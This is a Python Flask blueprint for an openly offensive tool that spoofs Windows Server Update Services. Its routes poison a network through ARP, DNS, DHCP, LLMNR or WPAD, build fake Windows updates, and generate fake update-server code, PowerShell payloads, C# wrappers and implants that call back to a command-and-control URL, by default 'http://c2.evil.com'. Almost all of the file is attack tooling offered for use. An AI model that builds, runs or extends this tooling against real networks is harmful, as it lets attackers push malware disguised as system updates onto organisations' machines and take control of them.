"""
WSUS Spoofing - Fake Windows Update Flask Routes
Inject Malicious Updates via Network Poisoning
"""

from flask import Blueprint, render_template, request, jsonify
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

try:
    from wsus_spoof import get_spoofer, PoisonMethod, UpdateSeverity, UpdateClassification
except ImportError:
    get_spoofer = None

wsus_spoof_bp = Blueprint('wsus_spoof', __name__, url_prefix='/wsus-spoof')


@wsus_spoof_bp.route('/')
def index():
    """WSUS Spoofer main page"""
    return render_template('wsus_spoof.html')


@wsus_spoof_bp.route('/api/create-session', methods=['POST'])
def create_session():
    """Create WSUS spoofing session"""
    if not get_spoofer:
        return jsonify({"error": "WSUS Spoofer module not available"}), 500
        
    data = request.get_json() or {}
    target_network = data.get('target_network', '10.0.0.0/24')
    poison_method = data.get('poison_method', 'arp')
    
    method_map = {
        'arp': PoisonMethod.ARP_SPOOF,
        'dns': PoisonMethod.DNS_SPOOF,
        'dhcp': PoisonMethod.DHCP_SPOOF,
        'llmnr': PoisonMethod.LLMNR_SPOOF,
        'wpad': PoisonMethod.WPAD_SPOOF,
        'proxy': PoisonMethod.MITM_PROXY
    }
    method = method_map.get(poison_method, PoisonMethod.ARP_SPOOF)
    
    spoofer = get_spoofer()
    session = spoofer.create_session(target_network, method)
    
    return jsonify({
        "success": True,
        "session_id": session.session_id,
        "target_network": session.target_network,
        "poison_method": session.poison_method.value,
        "wsus_server": {
            "server_id": session.wsus_server.server_id,
            "listen_port": session.wsus_server.listen_port
        }
    })


@wsus_spoof_bp.route('/api/create-update', methods=['POST'])
def create_update():
    """Create fake Windows Update package"""
    if not get_spoofer:
        return jsonify({"error": "WSUS Spoofer module not available"}), 500
        
    data = request.get_json() or {}
    kb_number = data.get('kb_number', 'KB5034441')
    title = data.get('title', '2025-02 Cumulative Update for Windows')
    severity = data.get('severity', 'critical')
    
    severity_map = {
        'critical': UpdateSeverity.CRITICAL,
        'important': UpdateSeverity.IMPORTANT,
        'moderate': UpdateSeverity.MODERATE,
        'low': UpdateSeverity.LOW
    }
    update_severity = severity_map.get(severity, UpdateSeverity.CRITICAL)
    
    spoofer = get_spoofer()
    update = spoofer.create_fake_update(
        kb_number=kb_number,
        title=title,
        payload=b"PLACEHOLDER_PAYLOAD",
        severity=update_severity
    )
    
    # Generate metadata
    metadata = spoofer.generate_wsus_metadata(update)
    update_xml = spoofer.generate_update_xml(update, f"http://wsus/Content/{kb_number}.exe")
    
    return jsonify({
        "success": True,
        "update": {
            "update_id": update.update_id,
            "kb_number": update.kb_number,
            "title": update.title,
            "severity": update.severity.value,
            "classification": update.classification.value,
            "silent_install": update.silent_install
        },
        "wsus_metadata": metadata,
        "update_xml": update_xml
    })


@wsus_spoof_bp.route('/api/generate-poison-script', methods=['POST'])
def generate_poison_script():
    """Generate network poisoning script"""
    if not get_spoofer:
        return jsonify({"error": "WSUS Spoofer module not available"}), 500
        
    data = request.get_json() or {}
    method = data.get('method', 'arp')
    target_network = data.get('target_network', '10.0.0.0/24')
    gateway_ip = data.get('gateway_ip', '10.0.0.1')
    wsus_ip = data.get('wsus_ip', '10.0.0.50')
    redirect_ip = data.get('redirect_ip', '192.168.1.100')
    
    spoofer = get_spoofer()
    
    if method == 'arp':
        script = spoofer.generate_arp_poison_script(target_network, gateway_ip, wsus_ip)
    elif method == 'dns':
        script = spoofer.generate_dns_poison_script(spoofer.WU_DOMAINS, redirect_ip)
    else:
        script = "# Not implemented for this method"
        
    return jsonify({
        "success": True,
        "method": method,
        "script": script
    })


@wsus_spoof_bp.route('/api/generate-server', methods=['POST'])
def generate_server():
    """Generate fake WSUS server code"""
    if not get_spoofer:
        return jsonify({"error": "WSUS Spoofer module not available"}), 500
        
    spoofer = get_spoofer()
    server_code = spoofer.generate_fake_wsus_server(b"PAYLOAD")
    
    return jsonify({
        "success": True,
        "server_code": server_code
    })


@wsus_spoof_bp.route('/api/generate-payload', methods=['POST'])
def generate_payload():
    """Generate malicious payload disguised as Windows Update"""
    if not get_spoofer:
        return jsonify({"error": "WSUS Spoofer module not available"}), 500
        
    data = request.get_json() or {}
    c2_url = data.get('c2_url', 'http://c2.evil.com')
    
    spoofer = get_spoofer()
    ps_payload = spoofer.generate_pyws_payload(c2_url)
    exe_wrapper = spoofer.generate_exe_payload_wrapper(ps_payload)
    
    return jsonify({
        "success": True,
        "powershell_payload": ps_payload.decode('utf-16-le'),
        "csharp_wrapper": exe_wrapper
    })


@wsus_spoof_bp.route('/api/responder-config', methods=['GET'])
def get_responder_config():
    """Get Responder configuration for WSUS spoofing"""
    if not get_spoofer:
        return jsonify({"error": "WSUS Spoofer module not available"}), 500
        
    spoofer = get_spoofer()
    config = spoofer.generate_responder_config()
    
    return jsonify({
        "success": True,
        "responder_config": config
    })


@wsus_spoof_bp.route('/api/detect-wsus', methods=['GET'])
def get_detect_script():
    """Get WSUS detection script"""
    if not get_spoofer:
        return jsonify({"error": "WSUS Spoofer module not available"}), 500
        
    spoofer = get_spoofer()
    script = spoofer.detect_wsus_config()
    
    return jsonify({
        "success": True,
        "detection_script": script
    })


@wsus_spoof_bp.route('/api/generate-implant', methods=['POST'])
def generate_implant():
    """Generate WSUS-aware implant"""
    if not get_spoofer:
        return jsonify({"error": "WSUS Spoofer module not available"}), 500
        
    data = request.get_json() or {}
    implant_type = data.get('type', 'powershell')
    c2_url = data.get('c2_url', 'http://c2.evil.com')
    
    spoofer = get_spoofer()
    implant_code = spoofer.generate_implant(implant_type, c2_url)
    
    return jsonify({
        "success": True,
        "implant_type": implant_type,
        "code": implant_code
    })


@wsus_spoof_bp.route('/api/attack-flow', methods=['GET'])
def get_attack_flow():
    """Get complete WSUS spoofing attack flow"""
    if not get_spoofer:
        return jsonify({"error": "WSUS Spoofer module not available"}), 500
        
    spoofer = get_spoofer()
    flow = spoofer.get_attack_flow()
    
    return jsonify({
        "success": True,
        "attack_flow": flow
    })


@wsus_spoof_bp.route('/api/tools', methods=['GET'])
def get_tools():
    """Get recommended tools for WSUS spoofing"""
    if not get_spoofer:
        return jsonify({"error": "WSUS Spoofer module not available"}), 500
        
    spoofer = get_spoofer()
    tools = spoofer.generate_wsuspect_config()
    
    return jsonify({
        "success": True,
        "tools": tools
    })


@wsus_spoof_bp.route('/api/poison-methods', methods=['GET'])
def get_poison_methods():
    """Get available network poisoning methods"""
    return jsonify({
        "success": True,
        "methods": [{"value": m.value, "name": m.name} for m in PoisonMethod]
    })


@wsus_spoof_bp.route('/api/severities', methods=['GET'])
def get_severities():
    """Get update severity levels"""
    return jsonify({
        "success": True,
        "severities": [{"value": s.value, "name": s.name} for s in UpdateSeverity]
    })


@wsus_spoof_bp.route('/api/statistics', methods=['GET'])
def get_statistics():
    """Get spoofer statistics"""
    if not get_spoofer:
        return jsonify({"error": "WSUS Spoofer module not available"}), 500
        
    session_id = request.args.get('session_id')
    
    spoofer = get_spoofer()
    
    if session_id:
        stats = spoofer.get_session_stats(session_id)
    else:
        stats = {
            "total_sessions": len(spoofer.sessions),
            "sessions": [spoofer.get_session_stats(sid) for sid in spoofer.sessions]
        }
    
    return jsonify({
        "success": True,
        "statistics": stats
    })
